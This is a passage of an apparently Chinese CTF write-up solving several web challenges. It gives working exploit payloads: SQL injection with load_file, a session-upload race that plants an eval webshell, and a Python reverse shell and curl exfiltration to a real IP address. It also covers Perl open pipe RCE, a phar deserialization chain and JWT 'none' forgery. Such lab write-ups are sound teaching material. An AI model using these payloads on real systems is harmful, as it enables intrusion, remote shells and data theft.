`user_name`, `address`, `phone`) values( ?, ?, ?)\u0026#34;; $re = $db-\u0026gt;prepare($sql); $re-\u0026gt;bind_param(\u0026#34;sss\u0026#34;, $user_name, $address, $phone); $re = $re-\u0026gt;execute(); if(!$re) { echo \u0026#39;error\u0026#39;; print_r($db-\u0026gt;error); exit; } $msg = \u0026#34;订单提交成功\u0026#34;; } } else { $msg = \u0026#34;信息不全\u0026#34;; } ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php require_once \u0026#34;config.php\u0026#34;; if(!empty($_POST[\u0026#34;user_name\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;address\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;phone\u0026#34;])) { $msg = \u0026#39;\u0026#39;; $pattern = \u0026#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i\u0026#39;; $user_name = $_POST[\u0026#34;user_name\u0026#34;]; $address = addslashes($_POST[\u0026#34;address\u0026#34;]); $phone = $_POST[\u0026#34;phone\u0026#34;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = \u0026#39;no sql inject!\u0026#39;; }else{ $sql = \u0026#34;select * from `user` where `user_name`=\u0026#39;{$user_name}\u0026#39; and `phone`=\u0026#39;{$phone}\u0026#39;\u0026#34;; $fetch = $db-\u0026gt;query($sql); } if (isset($fetch) \u0026amp;\u0026amp; $fetch-\u0026gt;num_rows\u0026gt;0){ $row = $fetch-\u0026gt;fetch_assoc(); $sql = \u0026#34;update `user` set `address`=\u0026#39;\u0026#34;.$address.\u0026#34;\u0026#39;, `old_address`=\u0026#39;\u0026#34;.$row[\u0026#39;address\u0026#39;].\u0026#34;\u0026#39; where `user_id`=\u0026#34;.$row[\u0026#39;user_id\u0026#39;]; $result = $db-\u0026gt;query($sql); if(!$result) { echo \u0026#39;error\u0026#39;; print_r($db-\u0026gt;error); exit; } 一眼二次注入,这里可以在地址的地方注入\n直接用报错注入的方式注入\n1 2 1\u0026#39; or updatexml(1,concat(0x7e,(select substr(load_file(\u0026#39;/flag.txt\u0026#39;),1,30))),1)# 1\u0026#39; or updatexml(1,concat(0x7e,(select substr(load_file(\u0026#39;/flag.txt\u0026#39;),30,60))),1)# 或者构造user_id的形式来注入\n1 1\u0026#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(\u0026#39;/flag.txt\u0026#39;),1,30)),0x7e),1)# 也可以这样让他报错\n1 1\u0026#39;,`user_id`=database()# 1 1\u0026#39;,`user_id`=(select(group_concat(schema_name))from(information_schema.schemata))# 1 \u0026#39;,`user_id`=(select(group_concat(table_name))from(information_schema.tables)where(table_schema=\u0026#39;ctftraining\u0026#39;))# 1 \u0026#39;,`user_id`=(select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;FLAG_TABLE\u0026#39;))# 1 2 \u0026#39;,`user_id`=(select FLAG_COLUMN from ctftraining.FLAG_TABLE limit 0,1)# 这里查出来空的，所以只能用上面的办法\n[WMCTF2020]Make PHP Great Again 这题用session包含可以解决是非预期\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import io import requests import threading sessid = \u0026#39;bbbbbbb\u0026#39; data = {\u0026#34;cmd\u0026#34;:\u0026#34;system(\u0026#39;cat flag.php\u0026#39;);\u0026#34;} def write(session): while True: f = io.BytesIO(b\u0026#39;a\u0026#39; * 1024 * 50) resp = session.post( \u0026#39;http://b0634b8b-ad08-4453-9292-3efff2a49706.node5.buuoj.cn:81/\u0026#39;, data={\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;: \u0026#39;\u0026lt;?php eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39;}, files={\u0026#39;file\u0026#39;: (\u0026#39;1.txt\u0026#39;,f)}, cookies={\u0026#39;PHPSESSID\u0026#39;: sessid} ) def read(session): while True: resp = session.post(\u0026#39;http://b0634b8b-ad08-4453-9292-3efff2a49706.node5.buuoj.cn:81/?file=/tmp/sess_\u0026#39;+sessid,data=data) if \u0026#39;1.txt\u0026#39; in resp.text: print(resp.text) event.clear() else: print(\u0026#34;[+++++++++++++]retry\u0026#34;) if __name__==\u0026#34;__main__\u0026#34;: event=threading.Event() with requests.session() as session: for i in range(1,30): threading.Thread(target=write,args=(session,)).start() for i in range(1,30): threading.Thread(target=read,args=(session,)).start() event.set() 预期解是要用到require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含\n[php源码分析 require_once 绕过不能重复包含文件的限制][https://www.anquanke.com/post/id/213235]\n1 php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php [网鼎杯 2020 白虎组]PicDown 非预期\n存在任意文件读取\n直接读/flag\n预期\n1 2 3 读取 /proc/self/environ /proc/self/cmdline 有个app.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 from flask import Flask, Response from flask import render_template from flask import request import os import urllib app = Flask(__name__) SECRET_FILE = \u0026#34;/tmp/secret.txt\u0026#34; f = open(SECRET_FILE) SECRET_KEY = f.read().strip() os.remove(SECRET_FILE) @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;search.html\u0026#39;) @app.route(\u0026#39;/page\u0026#39;) def page(): url = request.args.get(\u0026#34;url\u0026#34;) try: if not url.lower().startswith(\u0026#34;file\u0026#34;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype=\u0026#39;application/octet-stream\u0026#39;) response.headers[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment; filename=beautiful.jpg\u0026#39; return response else: value = \u0026#34;HACK ERROR!\u0026#34; except: value = \u0026#34;SOMETHING WRONG!\u0026#34; return render_template(\u0026#39;search.html\u0026#39;, res=value) @app.route(\u0026#39;/no_one_know_the_manager\u0026#39;) def manager(): key = request.args.get(\u0026#34;key\u0026#34;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(\u0026#34;shell\u0026#34;) os.system(shell) res = \u0026#34;ok\u0026#34; else: res = \u0026#34;Wrong Key!\u0026#34; return res if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8080) 最后这个路由要求secretkey\n注意关于SECRET_KEY的逻辑，虽然该文件在打开读取后被删除了，但是注意这个文件没有关闭，所以仍然可以通过/proc/self/fd/[num]访问对应文件（此处[num]代表一个未知的数值，需要从0开始遍历找出），这里在/proc/self/fd/3找到\n1 07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c= 下面就是弹shell\n1 2 3 nc -lvp 3333 /no_one_know_the_manager?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=\u0026amp;shell=python -c \u0026#34;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#39;47.122.53.248\u0026#39;,3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#39;/bin/bash\u0026#39;,\u0026#39;-i\u0026#39;]);\u0026#34; 1 /no_one_know_the_manager?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=\u0026amp;shell=python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2247.122.53.248%22,3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27 或者curl把数据外带\n1 2 ?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=\u0026amp;shell=curl 47.122.53.248:3333/`ls /|base64` ?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=\u0026amp;shell=curl 47.122.53.248:3333/`cat /flag|base64` [HITCON 2017]SSRFme 代码审计\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $http_x_headers = explode(\u0026#39;,\u0026#39;, $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]); $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] = $http_x_headers[0]; } echo $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]; $sandbox = \u0026#34;sandbox/\u0026#34; . md5(\u0026#34;orange\u0026#34; . $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(\u0026#34;GET \u0026#34; . escapeshellarg($_GET[\u0026#34;url\u0026#34;])); $info = pathinfo($_GET[\u0026#34;filename\u0026#34;]); $dir = str_replace(\u0026#34;.\u0026#34;, \u0026#34;\u0026#34;, basename($info[\u0026#34;dirname\u0026#34;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[\u0026#34;basename\u0026#34;]), $data); highlight_file(__FILE__); orange+ip的MD5值就是目录，然后url传data值给后面filename写入的文件\n题目叫ssrfme，我们先file://读一下文件\n1 ?url=file:///\u0026amp;filename=123 访问flag是空的，下面有个readflag显然要用命令执行readflag才行\n这里有前置知识，利用perl语言的漏洞：因为GET函数在底层调用了perl语言中的open函数，但是该函数存在rce漏洞。当open函数要打开的文件名中存在管道符（并且系统中存在该文件名），就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行。\n先创建文件\n1 ?url=\u0026amp;filename=|/readflag 然后执行命令\n1 ?url=file:|readflag\u0026amp;filename=123 但是这个好像有点问题，用bash命令试试\n1 2 ?url=\u0026amp;filename=|bash -c /readflag ?url=file:|bash -c /readflag\u0026amp;filename=123 或者直接写马蚁剑连接\n1 ?url=data://text,plain,\u0026#39;\u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt;\u0026#39;\u0026amp;filename=shell.php [CISCN2019 华北赛区 Day1 Web1]Dropbox 注册登入后有文件上传功能，不能上传php\n上传其他文件有下载功能存在目录穿越\nindex.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } ?\u0026gt; \u0026lt;?php include \u0026#34;class.php\u0026#34;; $a = new FileList($_SESSION[\u0026#39;sandbox\u0026#39;]); $a-\u0026gt;Name(); $a-\u0026gt;Size(); ?\u0026gt; class.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 \u0026lt;?php error_reporting(0); $dbaddr = \u0026#34;127.0.0.1\u0026#34;; $dbuser = \u0026#34;root\u0026#34;; $dbpass = \u0026#34;root\u0026#34;; $dbname = \u0026#34;dropbox\u0026#34;; $db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User { public $db; public function __construct() { global $db; $this-\u0026gt;db = $db; } public function user_exist($username) { $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;s\u0026#34;, $username); $stmt-\u0026gt;execute(); $stmt-\u0026gt;store_result(); $count = $stmt-\u0026gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-\u0026gt;user_exist($username)) { return false; } $password = sha1($password . \u0026#34;SiAchGHmFx\u0026#34;); $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;ss\u0026#34;, $username, $password); $stmt-\u0026gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-\u0026gt;user_exist($username)) { return false; } $password = sha1($password . \u0026#34;SiAchGHmFx\u0026#34;); $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;SELECT `password` FROM `users` WHERE `username` = ?;\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;s\u0026#34;, $username); $stmt-\u0026gt;execute(); $stmt-\u0026gt;bind_result($expect); $stmt-\u0026gt;fetch(); if (isset($expect) \u0026amp;\u0026amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-\u0026gt;db-\u0026gt;close(); } } class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-\u0026gt;files = array(); $this-\u0026gt;results = array(); $this-\u0026gt;funcs = array(); $filenames = scandir($path); $key = array_search(\u0026#34;.\u0026#34;, $filenames); unset($filenames[$key]); $key = array_search(\u0026#34;..\u0026#34;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-\u0026gt;open($path . $filename); array_push($this-\u0026gt;files, $file); $this-\u0026gt;results[$file-\u0026gt;name()] = array(); } } public function __call($func, $args) { array_push($this-\u0026gt;funcs, $func); foreach ($this-\u0026gt;files as $file) { $this-\u0026gt;results[$file-\u0026gt;name()][$func] = $file-\u0026gt;$func(); } } public function __destruct() { $table = \u0026#39;\u0026lt;div id=\u0026#34;container\u0026#34; class=\u0026#34;container\u0026#34;\u0026gt;\u0026lt;div class=\u0026#34;table-responsive\u0026#34;\u0026gt;\u0026lt;table id=\u0026#34;table\u0026#34; class=\u0026#34;table table-bordered table-hover sm-font\u0026#34;\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;thead\u0026gt;\u0026lt;tr\u0026gt;\u0026#39;; foreach ($this-\u0026gt;funcs as $func) { $table .= \u0026#39;\u0026lt;th scope=\u0026#34;col\u0026#34; class=\u0026#34;text-center\u0026#34;\u0026gt;\u0026#39; . htmlentities($func) . \u0026#39;\u0026lt;/th\u0026gt;\u0026#39;; } $table .= \u0026#39;\u0026lt;th scope=\u0026#34;col\u0026#34; class=\u0026#34;text-center\u0026#34;\u0026gt;Opt\u0026lt;/th\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;/thead\u0026gt;\u0026lt;tbody\u0026gt;\u0026#39;; foreach ($this-\u0026gt;results as $filename =\u0026gt; $result) { $table .= \u0026#39;\u0026lt;tr\u0026gt;\u0026#39;; foreach ($result as $func =\u0026gt; $value) { $table .= \u0026#39;\u0026lt;td class=\u0026#34;text-center\u0026#34;\u0026gt;\u0026#39; . htmlentities($value) . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;; } $table .= \u0026#39;\u0026lt;td class=\u0026#34;text-center\u0026#34; filename=\u0026#34;\u0026#39; . htmlentities($filename) . \u0026#39;\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;download\u0026#34;\u0026gt;下载\u0026lt;/a\u0026gt; / \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;delete\u0026#34;\u0026gt;删除\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;; } echo $table; } } class File { public $filename; public function open($filename) { $this-\u0026gt;filename = $filename; if (file_exists($filename) \u0026amp;\u0026amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-\u0026gt;filename); } public function size() { $size = filesize($this-\u0026gt;filename); $units = array(\u0026#39; B\u0026#39;, \u0026#39; KB\u0026#39;, \u0026#39; MB\u0026#39;, \u0026#39; GB\u0026#39;, \u0026#39; TB\u0026#39;); for ($i = 0; $size \u0026gt;= 1024 \u0026amp;\u0026amp; $i \u0026lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-\u0026gt;filename); } public function close() { return file_get_contents($this-\u0026gt;filename); } } ?\u0026gt; download.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } if (!isset($_POST[\u0026#39;filename\u0026#39;])) { die(); } include \u0026#34;class.php\u0026#34;; ini_set(\u0026#34;open_basedir\u0026#34;, getcwd() . \u0026#34;:/etc:/tmp\u0026#34;); chdir($_SESSION[\u0026#39;sandbox\u0026#39;]); $file = new File(); $filename = (string) $_POST[\u0026#39;filename\u0026#39;]; if (strlen($filename) \u0026lt; 40 \u0026amp;\u0026amp; $file-\u0026gt;open($filename) \u0026amp;\u0026amp; stristr($filename, \u0026#34;flag\u0026#34;) === false) { Header(\u0026#34;Content-type: application/octet-stream\u0026#34;); Header(\u0026#34;Content-Disposition: attachment; filename=\u0026#34; . basename($filename)); echo $file-\u0026gt;close(); } else { echo \u0026#34;File not exist\u0026#34;; } ?\u0026gt; delete.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } if (!isset($_POST[\u0026#39;filename\u0026#39;])) { die(); } include \u0026#34;class.php\u0026#34;; chdir($_SESSION[\u0026#39;sandbox\u0026#39;]); $file = new File(); $filename = (string) $_POST[\u0026#39;filename\u0026#39;]; if (strlen($filename) \u0026lt; 40 \u0026amp;\u0026amp; $file-\u0026gt;open($filename)) { $file-\u0026gt;detele(); Header(\u0026#34;Content-type: application/json\u0026#34;); $response = array(\u0026#34;success\u0026#34; =\u0026gt; true, \u0026#34;error\u0026#34; =\u0026gt; \u0026#34;\u0026#34;); echo json_encode($response); } else { Header(\u0026#34;Content-type: application/json\u0026#34;); $response = array(\u0026#34;success\u0026#34; =\u0026gt; false, \u0026#34;error\u0026#34; =\u0026gt; \u0026#34;File not exist\u0026#34;); echo json_encode($response); } ?\u0026gt; 构链子\n因为File类下面有file_get_contents可以读取文件，调用了close函数\n查找到User类里面有，但是这样调用会触发__call方法，我们用Filelist类里面的__call发现files变量会执行函数把结果以数组形式返回，我们直接令它为File类，将flag返回然后调用close函数回显\n1 User -\u0026gt;Filelist call -\u0026gt;File close() exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026lt;?php class User { public $db; } class FileList { private $files; public function __construct() { $this-\u0026gt;files = array(new File()); } } class File { public $filename=\u0026#39;/flag.txt\u0026#39;; public function close() { return file_get_contents($this-\u0026gt;filename); } } $o=new User(); $o-\u0026gt;db=new FileList(); @unlink(\u0026#34;phar.phar\u0026#34;); //生成phar时，文件的后缀名必须为phar $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); //设置stub $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); //将自定义的meta-data存入manifest，这个是利用的重点 $phar-\u0026gt;setMetadata($o); //添加要压缩的文件，这个文件可以不存在，但这句语句不能少 $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //签名自动计算 $phar-\u0026gt;stopBuffering(); ?\u0026gt; 生成phar后，找触发反序列化利用点\ndownload和delete里面由于download过滤flag\n我们在delete.php里面找到delete函数，回到class.php发现调用unlink函数刚好可以触发反序列化\n[HFCTF2020]EasyLogin 上来查看源码\napp.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 /** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD */ function login() { const username = $(\u0026#34;#username\u0026#34;).val(); const password = $(\u0026#34;#password\u0026#34;).val(); const token = sessionStorage.getItem(\u0026#34;token\u0026#34;); $.post(\u0026#34;/api/login\u0026#34;, {username, password, authorization:token}) .done(function(data) { const {status} = data; if(status) { document.location = \u0026#34;/home\u0026#34;; } }) .fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); }); } function register() { const username = $(\u0026#34;#username\u0026#34;).val(); const password = $(\u0026#34;#password\u0026#34;).val(); $.post(\u0026#34;/api/register\u0026#34;, {username, password}) .done(function(data) { const { token } = data; sessionStorage.setItem(\u0026#39;token\u0026#39;, token); document.location = \u0026#34;/login\u0026#34;; }) .fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); }); } function logout() { $.get(\u0026#39;/api/logout\u0026#39;).done(function(data) { const {status} = data; if(status) { document.location = \u0026#39;/login\u0026#39;; } }); } function getflag() { $.get(\u0026#39;/api/flag\u0026#39;).done(function(data) { const {flag} = data; $(\u0026#34;#username\u0026#34;).val(flag); }).fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); }); } 上面说用koa框架写的\nkoa框架基本目录 1 2 3 4 5 6 7 8 9 10 11 koa框架常用目录，文件 app/controllers 项目控制器存放目录：接收请求，处理逻辑 app/dbhelper 数据库CRUD操作的封装 app/models 对应数据库表表结构 config/router.js 项目路由 node_modules app.js 项目入口 访问controllers下的api.js得到源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 const crypto = require(\u0026#39;crypto\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;) const jwt = require(\u0026#39;jsonwebtoken\u0026#39;) const APIError = require(\u0026#39;../rest\u0026#39;).APIError; module.exports = { \u0026#39;POST /api/register\u0026#39;: async (ctx, next) =\u0026gt; { const {username, password} = ctx.request.body; if(!username || username === \u0026#39;admin\u0026#39;){ throw new APIError(\u0026#39;register error\u0026#39;, \u0026#39;wrong username\u0026#39;); } if(global.secrets.length \u0026gt; 100000) { global.secrets = []; } const secret = crypto.randomBytes(18).toString(\u0026#39;hex\u0026#39;); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign({secretid, username, password}, secret, {algorithm: \u0026#39;HS256\u0026#39;}); ctx.rest({ token: token }); await next(); }, \u0026#39;POST /api/login\u0026#39;: async (ctx, next) =\u0026gt; { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError(\u0026#39;login error\u0026#39;, \u0026#39;username or password is necessary\u0026#39;); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split(\u0026#39;.\u0026#39;)[1], \u0026#39;base64\u0026#39;).toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid \u0026lt; global.secrets.length \u0026amp;\u0026amp; sid \u0026gt;= 0)) { throw new APIError(\u0026#39;login error\u0026#39;, \u0026#39;no such secret id\u0026#39;); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: \u0026#39;HS256\u0026#39;}); const status = username === user.username \u0026amp;\u0026amp; password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, \u0026#39;GET /api/flag\u0026#39;: async (ctx, next) =\u0026gt; { if(ctx.session.username !== \u0026#39;admin\u0026#39;){ throw new APIError(\u0026#39;permission error\u0026#39;, \u0026#39;permission denied\u0026#39;); } const flag = fs.readFileSync(\u0026#39;/flag\u0026#39;).toString(); ctx.rest({ flag }); await next(); }, \u0026#39;GET /api/logout\u0026#39;: async (ctx, next) =\u0026gt; { ctx.session.username = null; ctx.rest({ status: true }) await next(); } }; jwt无签名\n不仅签名要改为none，secretid要改为[]，然后把username改为admin\n这里载的是PyJWT包，用python来伪造\n1 2 3 4 5 6 7 8 9 10 11 import jwt token = jwt.encode( { \u0026#34;secretid\u0026#34;: [], \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123456\u0026#34;, \u0026#34;iat\u0026#34;: 1742471740 }, algorithm=\u0026#34;none\u0026#34;, key=\u0026#34;\u0026#34;).encode(encoding=\u0026#39;utf-8\u0026#39;) print(token) bp修改放包然后访问/api/flag\n[SWPUCTF 2018]SimplePHP 查看源码\n查看文件这里有任意文件读取\nindex.php\n1 2 3 4 \u0026lt;?php header(\u0026#34;content-type:text/html;charset=utf-8\u0026#34;); include \u0026#39;base.php\u0026#39;; ?\u0026gt; base.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php session_start(); ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;web3\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;nav class=\u0026#34;navbar navbar-default\u0026#34; role=\u0026#34;navigation\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;navbar-header\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;index.php\u0026#34;\u0026gt;首页\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;ul class=\u0026#34;nav navbar-nav navbra-toggle\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;active\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;file.php?file=\u0026#34;\u0026gt;查看文件\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;upload_file.php\u0026#34;\u0026gt;上传文件\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;ul class=\u0026#34;nav navbar-nav navbar-right\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;index.php\u0026#34;\u0026gt;\u0026lt;span class=\u0026#34;glyphicon glyphicon-user\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;?php echo $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;];?\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;!--flag is in f1ag.php--\u0026gt; file.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php header(\u0026#34;content-type:text/html;charset=utf-8\u0026#34;); include \u0026#39;function.php\u0026#39;; include \u0026#39;class.php\u0026#39;; ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/var/www/html/\u0026#39;); $file = $_GET[\u0026#34;file\u0026#34;] ? $_GET[\u0026#39;file\u0026#39;] : \u0026#34;\u0026#34;; if(empty($file)) { echo \u0026#34;\u0026lt;h2\u0026gt;There is no file to show!\u0026lt;h2/\u0026gt;\u0026#34;; } $show = new Show(); if(file_exists($file)) { $show-\u0026gt;source = $file; $show-\u0026gt;_show(); } else if (!empty($file)){ die(\u0026#39;file doesn\\\u0026#39;t exists.\u0026#39;); } ?\u0026gt; function.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;?php //show_source(__FILE__); include \u0026#34;base.php\u0026#34;; header(\u0026#34;Content-type: text/html;charset=utf-8\u0026#34;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;].$_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]).\u0026#34;.jpg\u0026#34;; //mkdir(\u0026#34;upload\u0026#34;,0777); if(file_exists(\u0026#34;upload/\u0026#34; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;],\u0026#34;upload/\u0026#34; . $filename); echo \u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;上传成功!\u0026#34;);\u0026lt;/script\u0026gt;\u0026#39;; } function upload_file() 